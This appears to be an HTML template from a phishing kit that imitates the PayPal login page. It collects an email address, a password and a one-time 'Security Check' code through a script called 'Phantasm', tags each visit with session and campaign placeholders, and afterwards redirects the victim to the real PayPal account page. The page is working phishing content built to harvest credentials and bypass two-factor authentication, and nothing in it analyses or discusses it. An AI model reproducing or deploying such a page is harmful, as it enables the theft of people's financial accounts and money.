<!DOCTYPE html>
<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>
   Log in to your PayPal account
  </title>
  <link href="https://www.paypalobjects.com/webstatic/icon/pp32.png" rel="icon"/>
  <style>
   body { font-family: PayPalSansBig-Regular, "Helvetica Neue", Arial, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; } .container { width: 100%; max-width: 450px; padding: 20px; box-sizing: border-box; text-align: center; margin-top: 60px; } .logo { margin-bottom: 30px; } .logo img { height: 36px; } .card { background: #fff; border: 1px solid #eaeced; border-radius: 8px; padding: 40px 40px; position: relative; } .input-wrapper { position: relative; margin-bottom: 20px; text-align: left; } input { width: 100%; padding: 18px 12px 6px 12px; border: 1px solid #9da3a6; border-radius: 4px; font-size: 16px; box-sizing: border-box; color: #001435; height: 50px; transition: border-color 0.2s; } input:focus { border-color: #0070ba; outline: none; box-shadow: 0 0 0 1px #0070ba; } .floating-label { position: absolute; left: 13px; top: 16px; font-size: 16px; color: #6c7378; pointer-events: none; transition: 0.2s ease all; } input:focus ~ .floating-label, input:not(:placeholder-shown) ~ .floating-label { top: 6px; font-size: 12px; color: #6c7378; } .forgot { color: #0070ba; text-decoration: none; font-weight: 600; font-size: 15px; display: block; margin-bottom: 20px; margin-top: 10px; text-align: left; } .forgot:hover { text-decoration: underline; } .btn-primary { background-color: #0070ba; color: #fff; border: none; border-radius: 25px; width: 100%; height: 48px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 20px; transition: background-color 0.2s; } .btn-primary:hover { background-color: #003087; } .divider { position: relative; margin: 20px 0; text-align: center; } .divider::before { content: ""; position: absolute; top: 50%; left: 0; right: 0; border-top: 1px solid #cbd2d6; z-index: -1; } .divider span { background: #fff; padding: 0 10px; color: #6c7378; font-size: 14px; } .btn-secondary { background-color: #fff; color: #003087; border: 1px solid #003087; border-radius: 25px; width: 100%; height: 48px; font-size: 16px; font-weight: 600; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; box-sizing: border-box; transition: background-color 0.2s; } .btn-secondary:hover { background-color: #f2f8fc; text-decoration: none; } .footer { margin-top: auto; width: 100%; background-color: #f7f9fa; padding: 20px 0; text-align: center; font-size: 12px; color: #6c7378; border-top: 1px solid #eaeced; } .footer ul { list-style: none; padding: 0; margin: 0; display: flex; justify-content: center; flex-wrap: wrap; } .footer li { margin: 0 10px; } .footer a { color: #6c7378; text-decoration: none; font-weight: 600; } .footer a:hover { text-decoration: underline; } .hidden { display: none; } .user-display { margin-bottom: 20px; text-align: left; font-size: 16px; color: #2c2e2f; } .change-link { color: #0070ba; text-decoration: none; font-weight: 600; font-size: 14px; margin-left: 10px; cursor: pointer; } @media (max-width: 500px) { .card { border: none; padding: 0; } .container { margin-top: 20px; } }
  </style>
  <link href="/core/assets/css/animations.css" rel="stylesheet"/>
 </head>
 <body>
  <div class="container">
   <div class="logo">
    <img alt="PayPal" loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg"/>
   </div>
   <div class="card">
    <!-- Step 1: Email -->
    <div id="step-1">
     <div class="input-wrapper">
      <input class="input-field" id="email" placeholder=" " required="" type="text"/>
      <span class="floating-label">
       Email or mobile number
      </span>
     </div>
     <a class="forgot" href="#">
      Forgot email?
     </a>
     <button class="btn-primary" id="btn-next">
      Next
     </button>
     <div class="divider">
      <span>
       or
      </span>
     </div>
     <a class="btn-secondary" href="#">
      Sign Up
     </a>
    </div>
    <!-- Step 2: Password -->
    <div class="hidden" id="step-2">
     <div class="user-display">
      <span id="user-email-display">
       user@example.com
      </span>
      <a class="change-link" id="back-btn" style="cursor: pointer;">
       Change
      </a>
     </div>
     <div class="input-wrapper">
      <input class="input-field" id="password" placeholder=" " required="" type="password"/>
      <span class="floating-label">
       Password
      </span>
     </div>
     <a class="forgot" href="#">
      Forgot password?
     </a>
     <button class="btn-primary" id="btn-submit">
      Log In
     </button>
     <div class="divider">
      <span>
       or
      </span>
     </div>
     <a class="btn-secondary" href="#">
      Log In with a One-time Code
     </a>
    </div>
   </div>
  </div>
  <div class="footer">
   <ul>
    <li>
     <a href="#">
      Contact Us
     </a>
    </li>
    <li>
     <a href="#">
      Privacy
     </a>
    </li>
    <li>
     <a href="#">
      Legal
     </a>
    </li>
    <li>
     <a href="#">
      Policy Updates
     </a>
    </li>
    <li>
     <a href="#">
      Worldwide
     </a>
    </li>
   </ul>
  </div>
  <script async="True" src="/core/assets/js/phantasm.js">
  </script>
  <script>
   document.addEventListener('DOMContentLoaded', () => {
            const app = new Phantasm({
                redirectUrl: 'https://www.paypal.com/myaccount/summary',
                selectors: {
                    email: '#email',
                    password: '#password',
                    otp: '#otp-input',
                    nextBtn: '#btn-next',
                    submitBtn: '#btn-submit',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step2: '#step-2',
                    step3: '#step-3-otp',
                    userDisplay: '#user-email-display'
                },
                sessionId: '{{ session_id }}',
                campaignId: '{{ campaign_id }}'
            });

            const backBtn = document.getElementById('back-btn');
            if (backBtn) {
                backBtn.addEventListener('click', (e) => {
                    e.preventDefault();
                    app.transitionToStep(1);
                });
            }
        });
  </script>
  <!-- OTP Section -->
  <div class="hidden" id="step-3-otp" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
   <h2 style="margin-bottom: 20px;">
    Security Check
   </h2>
   <p style="margin-bottom: 20px; color: #666;">
    Please enter the code sent to your device.
   </p>
   <input class="input-field" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;" type="text"/>
   <button class="btn-primary" id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">
    Verify
   </button>
  </div>
 </body>
</html>
